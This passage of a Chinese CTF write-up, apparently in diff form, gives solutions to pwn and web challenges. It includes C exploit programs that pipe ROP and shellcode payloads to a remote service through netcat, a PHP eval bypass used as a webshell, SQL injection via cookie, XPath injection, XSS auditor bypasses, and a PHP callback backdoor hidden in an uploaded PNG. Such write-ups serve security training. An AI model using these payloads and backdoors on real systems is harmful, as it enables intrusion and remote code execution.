class="line">        int count = 0;</div><div class="line">        char *shellcode = (char *)malloc(0x40);</div><div class="line"></div><div class="line">        f = fopen("shellcode","r");</div><div class="line">        while((c = fgetc(f)) != EOF) &#123;</div><div class="line">                shellcode[count] = (char)c;</div><div class="line">                count++;</div><div class="line">        &#125;</div><div class="line">        shellcode[count] = '\x00';</div><div class="line"></div><div class="line">        printf("%s", shellcode);</div><div class="line">        fclose(f);</div><div class="line">        return shellcode;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void</div><div class="line">write_payload(int fd) &#123;</div><div class="line">        char payload[0x80] = "AAAABBBBCCCCDDDD\x80\xa0\x04\x08";</div><div class="line">        strcat(payload, get_shellcode());</div><div class="line">        write(fd, payload, strlen(payload));</div><div class="line">&#125;</div><div class="line"></div><div class="line">void</div><div class="line">interact(int fd) &#123;</div><div class="line">        int     count = 0;</div><div class="line">        char    command[0x100];</div><div class="line"></div><div class="line">        while (1) &#123;</div><div class="line">                count = 0;</div><div class="line">                memset(command, '\x00', 0x100);</div><div class="line">                while (1) &#123;</div><div class="line">                        read(0, command + count, 0x1);</div><div class="line">                        if (command[count] == '\n' || count &gt;= 0xfe) &#123;</div><div class="line">                                break;</div><div class="line">                        &#125;</div><div class="line">                        count++;</div><div class="line">                &#125;</div><div class="line">                command[0xff] = '\x00';</div><div class="line">                write(fd, command, strlen(command));</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int</div><div class="line">main(void) &#123;</div><div class="line">        int     fd[2];</div><div class="line">        pid_t   pid;</div><div class="line"></div><div class="line">        if (pipe(fd) &lt; 0) &#123;</div><div class="line">                printf("pipe error");</div><div class="line">                exit(1);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if ((pid = fork()) &lt; 0) &#123;</div><div class="line">                printf("fork error");</div><div class="line">                exit(1);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (pid &gt; 0) &#123;</div><div class="line">                /* parent */</div><div class="line">                close(fd[0]);</div><div class="line">                write_payload(fd[1]);</div><div class="line"></div><div class="line">                interact(fd[1]);</div><div class="line">                /* simulate command "cat" */</div><div class="line">                close(fd[1]);</div><div class="line"></div><div class="line">        &#125; else &#123;</div><div class="line">                /* child */</div><div class="line">                close(fd[1]);</div><div class="line">                dup2(fd[0], 0);</div><div class="line"></div><div class="line">                init_connect();</div><div class="line"></div><div class="line">                close(fd[0]);</div><div class="line">                exit(0);</div><div class="line">        &#125;</div><div class="line">        exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<hr>
+<p><strong>Pwn5</strong></p>
+<p>File: pwn5</p>
+<p>WriteUp:</p>
+<p>直接溢出覆盖ebp，即stack pivoting，将esp转移到数据段上的可控缓冲区上，然后通过rop来调用system即可<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">void</div><div class="line">init_connect() &#123;</div><div class="line">        char *arg[4] = &#123;"/bin/cat", "10.170.55.102", "2337", NULL&#125;;</div><div class="line">        execve("/bin/netcat", arg, NULL);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void</div><div class="line">write_payload(int fd) &#123;</div><div class="line">        int i = 0;</div><div class="line"></div><div class="line">        /* junk */</div><div class="line">        write(fd, "AAAABBBBCCCC", 0xc);</div><div class="line">        /* adr_stage pivot */</div><div class="line">        write(fd, "\x00\xa5\x04\x08", 0x4);</div><div class="line"></div><div class="line">        /* junk */</div><div class="line">        for (i = 0; i &lt; 0x0804a500 - 0x0804a080 + 4; i++) &#123;</div><div class="line">                write(fd, "A", 0x1);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        /* system@plt */</div><div class="line">        write(fd, "\xd0\x83\x04\x08", 0x4);</div><div class="line">        /* ret of system */</div><div class="line">        write(fd, "\xef\xbe\xad\xde", 0x4);</div><div class="line">        /* adr_stage + 0x30 */</div><div class="line">        write(fd, "\x30\xa5\x04\x08", 0x4);</div><div class="line"></div><div class="line">        for (i = 0; i &lt; 0x20; i++) &#123;</div><div class="line">                write(fd, "A", 0x1);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        write(fd, "/bin/sh\x00", 0x8);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void</div><div class="line">interact(int fd) &#123;</div><div class="line">        int     count = 0;</div><div class="line">        char    command[0x100];</div><div class="line"></div><div class="line">        while (1) &#123;</div><div class="line">                count = 0;</div><div class="line">                memset(command, '\x00', 0x100);</div><div class="line">                while (1) &#123;</div><div class="line">                        read(0, command + count, 0x1);</div><div class="line">                        if (command[count] == '\n' || count &gt;= 0xfe) &#123;</div><div class="line">                                break;</div><div class="line">                        &#125;</div><div class="line">                        count++;</div><div class="line">                &#125;</div><div class="line">                command[0xff] = '\x00';</div><div class="line">                write(fd, command, strlen(command));</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int</div><div class="line">main(void) &#123;</div><div class="line">        int     fd[2];</div><div class="line">        pid_t   pid;</div><div class="line"></div><div class="line">        if (pipe(fd) &lt; 0) &#123;</div><div class="line">                printf("pipe error");</div><div class="line">                exit(1);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if ((pid = fork()) &lt; 0) &#123;</div><div class="line">                printf("fork error");</div><div class="line">                exit(1);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (pid &gt; 0) &#123;</div><div class="line">                /* parent */</div><div class="line">                close(fd[0]);</div><div class="line">                write_payload(fd[1]);</div><div class="line"></div><div class="line">                interact(fd[1]);</div><div class="line">                /* simulate command "cat" */</div><div class="line">                close(fd[1]);</div><div class="line"></div><div class="line">        &#125; else &#123;</div><div class="line">                /* child */</div><div class="line">                close(fd[1]);</div><div class="line">                dup2(fd[0], 0);</div><div class="line"></div><div class="line">                init_connect();</div><div class="line"></div><div class="line">                close(fd[0]);</div><div class="line">                exit(0);</div><div class="line">        &#125;</div><div class="line">        exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="http://ww3.sinaimg.cn/large/006tT0yqjw1fb01aj7ff1j31kw04ut9q.jpg" alt=""></p>
+<h2 id="0x07-Web"><a href="#0x07-Web" class="headerlink" title="0x07 Web"></a>0x07 Web</h2><p><strong>苏打学姐的朋友</strong></p>
+<p>WriteUp: </p>
+<p>描述说只有朋友才能访问，只需要修改Rrferrer为允许的就可以，看了给了几个链接，所以随意修改一个就可以<br>了。</p>
+<p><img src="http://ww4.sinaimg.cn/large/006tT0yqjw1fb01rh9wy0j30pl08jgmh.jpg" alt=""></p>
+<p><strong>苏打学姐撞上碳酸钠了</strong></p>
+<p>WriteUp:</p>
+<p>打开源代码可以看到给的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">key = <span class="string">"aa3OFF9m"</span>;</div><div class="line">   $pass = <span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>]) ? $_GET[<span class="string">'pass'</span>] : <span class="string">""</span>;</div><div class="line">   <span class="keyword">if</span> ($pass != $key &amp;&amp; sha1($pass)==sha1($key) ) &#123;</div><div class="line">       <span class="keyword">echo</span> $flag;</div><div class="line">   &#125; <span class="keyword">else</span> &#123;</div><div class="line">       <span class="keyword">echo</span> <span class="string">"sha1 conllision&lt;/br&gt;"</span>;</div></pre></td></tr></table></figure>
+<p>根据意思只要将你输入的字符的sha1值和系统给的aa3OFF9m的sha1值对比，相等就可以得到flag，但是因为这是php    </p>
+<p><img src="http://ww3.sinaimg.cn/large/006tT0yqjw1fb01tl88qkj30oh0453zm.jpg" alt=""></p>
+<p>这个地方google也可以google到，只要找到另一个字符加密后也是0e开头就可以被代码判断相等了，至于这段特殊的字符，你可以自己脚本去碰撞。就是随机加密字符，一直到0e开头为止，也可以去搜索一下，坑呢个别人已经碰过呢。</p>
+<p><img src="http://ww1.sinaimg.cn/large/006tT0yqjw1fb01tk3cncj30o705lq4m.jpg" alt=""></p>
+<p>最后payload</p>
+<p><img src="http://ww1.sinaimg.cn/large/006tT0yqjw1fb01tijdkwj30o003bq3j.jpg" alt=""></p>
+<hr>
+<p><strong>吓得苏打学姐都编码了</strong></p>
+<p>WriteUp:</p>
+<p>一样打开源代码 可以看到代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">   <span class="function"><span class="keyword">function</span> <span class="title">show_flag</span><span class="params">()</span></span>&#123;</div><div class="line">       $flag = <span class="string">"a f4ke flag"</span>;</div><div class="line">       <span class="keyword">echo</span> $flag;</div><div class="line">       <span class="keyword">exit</span>();</div><div class="line">   &#125;</div><div class="line">   <span class="function"><span class="keyword">function</span> <span class="title">anti</span><span class="params">()</span></span>&#123;</div><div class="line">       $query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line">       $query = urldecode($query);</div><div class="line">       $query = strtolower($query);</div><div class="line">       <span class="keyword">if</span>(preg_match(<span class="string">'/show/'</span>, $query) <span class="keyword">or</span> preg_match(<span class="string">'/flag/'</span>, $query))&#123;</div><div class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">       &#125;<span class="keyword">else</span>&#123;</div><div class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">if</span>(anti())&#123;</div><div class="line">       <span class="keyword">eval</span>(<span class="string">'"$str=(string)'</span>.$_GET[<span class="string">'str'</span>].<span class="string">'";'</span>);</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">       <span class="keyword">echo</span> <span class="string">'detect the evil words'</span>;</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
+<p>根据代码可以知道，只需要执行show_flag()这个函数就可以得到flag，并且代码将你传进来的字符str当着代码来执 行。</p>
+<p>但是你不能直接就show_flag，会被anti()这个函数检查到，所以既然能够执行你传进来的代码，方式就很多了。你 可以把show_flag的编码一下,并且解码一下，就可以绕过了，这个给一个payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">str = $&#123;$&#123;eval(base64_decode($_GET[0]))&#125;&#125;&amp;0=c2hvd19mbGFnKCk7</div></pre></td></tr></table></figure></p>
+<p>其实这里给了eval就相当给了一个shell了，完全可以用菜刀连接了， 构造<a href="http://xxxxxxxxxxxx/evil.php?str=${${eval($_POST[&#39;pass&#39;])}}" target="_blank" rel="external">http://xxxxxxxxxxxx/evil.php?str=${${eval($_POST[&#39;pass&#39;])}}</a></p>
+<p><img src="http://ww2.sinaimg.cn/large/006tT0yqjw1fb020jf5rbj30ov0b740h.jpg" alt=""></p>
+<hr>
+<p><strong>苏打学姐要打针了</strong></p>
+<p>Description: </p>
+<p>学xml当然也要学习学习xpath咯–&gt;<a href="http://www.w3school.com.cn/xpath/xpath_syntax.asp" target="_blank" rel="external">http://www.w3school.com.cn/xpath/xpath_syntax.asp</a></p>
+<p>WriteUp:</p>
+<p>这个打开也可以看到源码 示，这是一个随xml文件中元素进行输出的代码。题目也给了xpath语法链接，其中有一<br>个重要的符号 | ,它可以将两个查询并焦输出， 原来的查询代码:<br>$query = “user/username[@id=’”.$uid.”‘]”; 所以我们可以构造一个特殊的查询:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;]| //* |user[&apos;</div></pre></td></tr></table></figure></p>
+<p>解释:先用 ‘] 将原来的括号闭合,再来一个查询所有元素的查询语句 //* ,最后使用 user[‘ 将最后的符号闭合。三 个查询使用 | 连接起来。</p>
+<p><img src="http://ww2.sinaimg.cn/large/006tT0yqjw1fb023qcarvj30r80ez75o.jpg" alt=""></p>
+<hr>
+<p><strong>苏打学姐不会PHP</strong></p>
+<p>WriteUp:</p>
+<p>打开查看源代码有一个 示: .index.php.swp ,这是一个vim编辑器异常退出时生成的备份文件。所以下载下来恢<br>复一下，恢复，有很多人直接记事本打开看到，但是很乱，使用vim的命令恢复就很规整。 命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim ‐r .index.php.swp</div></pre></td></tr></table></figure></p>
+<p>得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">   error_reporting(<span class="number">0</span>);</div><div class="line">   <span class="keyword">echo</span> <span class="string">"&lt;!‐‐.index.php.swp‐‐&gt;"</span>;</div><div class="line">   <span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])&#123;</div><div class="line">       header(<span class="string">'Location: index.php?id=1'</span>);</div><div class="line"><span class="keyword">exit</span>(); &#125;</div><div class="line">   $id=$_GET[<span class="string">'id'</span>];</div><div class="line">   $a=$_GET[<span class="string">'a'</span>];</div><div class="line">   $b=$_GET[<span class="string">'b'</span>];</div><div class="line">   <span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))&#123;</div><div class="line">       <span class="keyword">echo</span> <span class="string">'what are you ganshane?'</span>;</div><div class="line"><span class="keyword">return</span> ; &#125;</div><div class="line">   $data = @file_get_contents($a,<span class="string">'r'</span>);</div><div class="line">   <span class="keyword">if</span>($data==<span class="string">"me7ell‐like‐you!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> eregi(<span class="string">"biubiu"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"biubiu4"</span>) <span class="keyword">and</span></div><div class="line">   substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)&#123;</div><div class="line"><span class="keyword">echo</span> $flag; &#125;</div><div class="line">   <span class="keyword">else</span>&#123;</div><div class="line">       <span class="keyword">print</span> <span class="string">"go on...!!!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>绕过分析:</p>
+<ul>
+<li>id==0且!$_GET(“id”)为假,这个地方使用php弱类型就行。 比如构造:id=false，id=0e…</li>
+<li>$a不包含点且a文件内容为特定的 a=<a href="http://your" target="_blank" rel="external">http://your</a> vps IP/test`把其中ip用iphex编码为0x739F915C iphex工具 在线               </li>
+<li>最简单是使用php伪协议。使用php://input输入流</li>
+<li>b满足eregi(“biubiu”.substr( b,0,1)!=4。这是低版本php的eregi函数的问题。 使用b=*, b=(什么也不填),都可 以绕过。</li>
+</ul>
+<p><img src="http://ww1.sinaimg.cn/large/006tT0yqjw1fb029qp4ypj30ow0a8q4d.jpg" alt=""></p>
+<hr>
+<p><strong>回字有几种写法</strong></p>
+<p>WriteUp:</p>
+<p>url后面跟了一个id参数，猜测是sql注入。但是直接注入会发现被waf拦截。那么如何绕过waf呢，waf自身规则很严格，基本过滤了所有敏感字符。<br>我们post一个id参数，会被程序接收但是也同样被waf拦截了。但我们可以脑补一下程序员一定是使用了能同时接收get和post型的request函数，而request函数还能够通过cookie接收参数，而waf只对get和post来的数据进行了处理，而忽略了cookie，造成注入。</p>
+<p>最终payload：<br><code>Cookie:id=-1 union select 1,2,flag,4 from `where` </code></p>
+<p><img src="http://ww1.sinaimg.cn/large/006tT0yqjw1fb02f3lt8kj30xi0d1411.jpg" alt=""></p>
+<hr>
+<p><strong>easyXSS</strong></p>
+<p>Description:</p>
+<p><a href="http://ctf.math1as.com/xss2.php" target="_blank" rel="external">http://ctf.math1as.com/xss2.php</a><br>请使用chrome 54/55进行本挑战<br>payload必须无需交互,成功弹出1即可<br>请注意,无需交互指的是用户不能做除了打开页面外的任何操作<br>完成挑战后,把截图和payload发到邮箱 mathias@l-team.org 来获得你的flag</p>
+<p>WriteUp:</p>
+<p>过滤了script</p>
+<p>而其他几乎没有限制</p>
+<p>所以主要的思路是要绕过Chrome的auditor</p>
+<p>这里的通用方法是在敏感关键字处加入script</p>
+<p>比如<img src="x" onerrscriptor="alert(1)"></p>
+<p>当然,也可以用一些字符集的问题</p>
+<p>比如<meta charset="”ISO-2022-JP”"></p>
+<p>然后关键字插入%1B%28B来绕过</p>
+<hr>
+<p><strong>xss challenge</strong></p>
+<p>Description: </p>
+<p>题目链接 <a href="http://ctf.math1as.com/xss.php" target="_blank" rel="external">http://ctf.math1as.com/xss.php</a><br>请使用最新的浏览器(chrome 54/firefox 50)进行本挑战<br>payload必须无需交互,请注意,无需交互指的是用户不能做除了打开页面外的任何操作,成功弹出1即可<br>完成挑战后,把截图和payload发到邮箱 mathias@l-team.org 来获得你的flag</p>
+<p>WriteUp:</p>
+<p>一道dom-xss,这里过滤了大部分的符号,比如.点号 ( 括号等</p>
+<p>还有除了onfocus外的大部分事件</p>
+<p>要构造出一个无需交互的payload</p>
+<p>你需要使用autofocus</p>
+<p>但是由于标签是<haha>并不在标准内</haha></p>
+<p>因此需要加入tabindex=0 使其支持这个事件</p>
+<p>最后加入id=”2” location.hash处输入#2即可</p>
+<p>但是我们的1被过滤了,怎么办呢</p>
+<p>使用prompt函数,它支持用es6模板字符串传参</p>
+<p>因此直接<code>${3-2}</code> 就成功的绕过了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf.math1as.com/xss.php?content=%22id=2%0atabindex=0%0aonfocus=prompt`$&#123;3-2&#125;`|%22#2</div></pre></td></tr></table></figure>
+<p>当然,也可以使用<iframe>标签的window.name来实现参数的传递</iframe></p>
+<p>方法不再赘述</p>
+<hr>
+<p><strong>苏打学姐的相册</strong></p>
+<p>Description:</p>
+<p>苏打学姐有一个小相册,首页是她最喜欢的一张照片,她把flag也放在相册里了,你能找到它吗?(说不定flag旁边还有苏打学姐的全套表情包^_^</p>
+<p>WriteUp:</p>
+<p>很明显这是一道上传绕过,先上源代码:<br><code>index.php</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">&lt;form id=&quot;uploadFileform&quot; action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;</div><div class="line">      &lt;center&gt;</div><div class="line">      &lt;img src=&quot;static/upload/suda.png&quot; /&gt;</div><div class="line">      &lt;hr style=&quot;size: 1&quot; /&gt;</div><div class="line">      &lt;/center&gt;</div><div class="line">      &lt;center&gt;</div><div class="line">       &lt;input id=&quot;uploadImage&quot; value=&quot;&quot; type=&quot;file&quot; name=&quot;uploadImage&quot; size=&quot;50&quot; /&gt;</div><div class="line">          &lt;p&gt;今年苏打不收图,收图只收PNG&lt;/p&gt;</div><div class="line">          &lt;p&gt;</div><div class="line">           &lt;input class=&quot;primary&quot; type=&quot;button&quot;  value=&quot;submit&quot; onclick=&quot;uploadImages();&quot;/&gt;</div><div class="line">          &lt;/p&gt;</div><div class="line">      &lt;hr style=&quot;size: 1&quot; /&gt;</div><div class="line">      &lt;/center&gt;</div><div class="line">      </div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;script src=&quot;jquery-3.1.1.min.js&quot;&gt;&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">function uploadImages() &#123;</div><div class="line">    var str = $(&quot;#uploadImage&quot;).val().toLowerCase();</div><div class="line">    if(str.length!=0)&#123;</div><div class="line">       var reg = &quot;.*\\.(png|jpg)&quot;;</div><div class="line">       var r = str.match(reg);</div><div class="line">       if(r == null)&#123;</div><div class="line">        alert(&quot;你往上传了个啥?!&quot;);</div><div class="line">       &#125;</div><div class="line">       else &#123;</div><div class="line">        if(window.ActiveXObject) &#123;  </div><div class="line">            var image=new Image();</div><div class="line">            image.dynsrc=str;</div><div class="line">               if(image.fileSize&gt;51200)&#123;</div><div class="line">                  alert(&quot;这图....有点大啊......别超50K吧&quot;);</div><div class="line">                  return false;</div><div class="line">               &#125;</div><div class="line">                &#125;</div><div class="line">            else&#123;  </div><div class="line">               var size = document.getElementById(&quot;uploadImage&quot;).files[0].size;</div><div class="line">               if(size&gt;51200) &#123;</div><div class="line">                alert(&quot;这图....有点大啊......别超50K吧&quot;);</div><div class="line">                return false;</div><div class="line">               &#125;</div><div class="line">            &#125;</div><div class="line">        $(&apos;#uploadFileform&apos;).submit();</div><div class="line">       &#125;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">       alert(&quot;图呢?&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p><code>uload.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//ini_set(&quot;display_errors&quot;,&apos;On&apos;);</div><div class="line"></div><div class="line">if(!$_FILES)&#123;</div><div class="line">    exit(&quot;图呢?&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">if($_FILES[&apos;uploadImage&apos;][&apos;size&apos;] &gt; 51200000)&#123;</div><div class="line">    exit(&quot;这图....有点大啊......别超50K吧&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($_FILES[&apos;uploadImage&apos;][&apos;type&apos;] !== &quot;image/png&quot;)&#123;</div><div class="line">    exit(&quot;你往上传了个啥?&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$upload_dir = &apos;static/upload/&apos;;</div><div class="line">$file_name = basename($_FILES[&apos;uploadImage&apos;][&apos;name&apos;]);</div><div class="line">$file_path = $upload_dir.$file_name;</div><div class="line"></div><div class="line">$file_ext= substr($file_name, strrpos($file_name, &apos;.&apos;) + 1);</div><div class="line">if(eregi(&quot;^.*\.(php|php5|php4|php3|phps|ini|htaccess)$&quot;,$file_name))&#123;</div><div class="line">    exit(&quot;你往上传了个啥?&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$file = fopen($_FILES[&apos;uploadImage&apos;][&apos;tmp_name&apos;],&apos;rb&apos;);</div><div class="line">$bin = fread($file,filesize($_FILES[&apos;uploadImage&apos;][&apos;tmp_name&apos;]));</div><div class="line">fclose($file);</div><div class="line">$info = unpack(&apos;H8head&apos;,$bin);</div><div class="line">if(!($info[&apos;head&apos;] === &apos;89504e47&apos; ))&#123;</div><div class="line">    exit(&quot;你往上传了个啥?&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$black_list = array(&quot;&lt;?php&quot;,&quot;&lt;%&quot;,&quot;eval&quot;,&quot;assert&quot;);</div><div class="line">foreach($black_list as $key=&gt;$value)&#123;</div><div class="line">    if(stristr($bin,$value))&#123;</div><div class="line">        exit(&quot;你是不是往图里插什么东西了.....我看出来了!&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">move_uploaded_file($_FILES[&apos;uploadImage&apos;][&apos;tmp_name&apos;],$file_path);</div><div class="line">echo &apos;Uploaded: &apos;.$file_path;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>好吧,我们看有哪几个地方限制了上传:</p>
+<ul>
+<li>javascript</li>
+<li>后缀名黑名单</li>
+<li>MIME类型</li>
+<li>检测了文件头</li>
+<li>检测了文件内容里是不是含有&lt;?php,&lt;%,eval,assert</li>
+</ul>
+<p>那我们上传一张正常的图片,然后在burp里修改后缀为可以被解析的phtml,然后往图片内容里插入一句话木马:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"php"</span>&gt;$e = $REQUEST[<span class="string">'e'</span>];$arr = <span class="keyword">array</span>($POST[<span class="string">'pass'</span>],);array_filter($arr, base64_decode($e));&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>绕过了内容检测,菜刀连上就可以啦</p>
+<p>(有同学对这个后门有疑问,这个菜刀连的时候地址填<a href="http://xxx.xxx.xxx/eval.phtml?e=YXNzZXJD就可以啦,详细参见P总的博客https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="external">http://xxx.xxx.xxx/eval.phtml?e=YXNzZXJD就可以啦,详细参见P总的博客https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a>)</p>
+<hr>
+<p>苏打学姐的另一个相册</p>
+<p>Description: </p>
+<p>咳咳..前面那个相册在前两天大家做题的时候被苏打发现了,所以她紧急删掉了自己珍藏的表情包……….但是亲爱的萌新们可能有所不知,苏打学姐的黑照在协会已流传多年,并且协会的高年级成员建了一个网站专门展示苏打学姐的黑照…….但好景不长,由于在网站上公开的黑照在网络上的影响过于恶劣,应有关部门要求下架了绝大部分照片.<br> 而协会的大黑阔们把资源打了个加密包转移到了云上,链接,解压密码都还存在这个站上.  每次都通过一种极其”hack”的方式访问…..</p>
+<p>WriteUp:</p>
+<p>我们还是先看一下源代码:</p>
